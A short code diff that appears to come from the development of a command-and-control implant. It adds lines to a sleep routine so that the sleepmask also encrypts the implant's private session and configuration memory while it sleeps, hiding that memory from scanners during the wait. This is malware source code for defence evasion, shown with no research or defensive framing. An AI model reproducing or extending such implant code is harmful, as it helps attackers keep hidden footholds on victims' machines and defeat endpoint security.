@@ -34,6 +34,13 @@ FUNC VOID WINAPI NaxGateSleep( DWORD dwMilliseconds ) {
 
     Nax->SmInfo.ActiveJobCount = NaxCountRunningJobs( Nax );
 
+    /* W0.7: hand the sleepmask the instance private region (SessionId+Config)
+     * so it masks it with the same per-sleep key while the code span sleeps.
+     * The sleepmask reads SmInfo/Config before masking starts and never reads
+     * Nax fields during the wait, so nothing touches masked bytes. */
+    Nax->SmInfo.PrivateBase = NAX_PRIV_BASE( Nax );
+    Nax->SmInfo.PrivateLen  = NAX_PRIV_LEN( Nax );
+
     FUNCTION_CALL fc;
     MmZero( &fc, sizeof( fc ) );
     fc.SmInfo = &Nax->SmInfo;
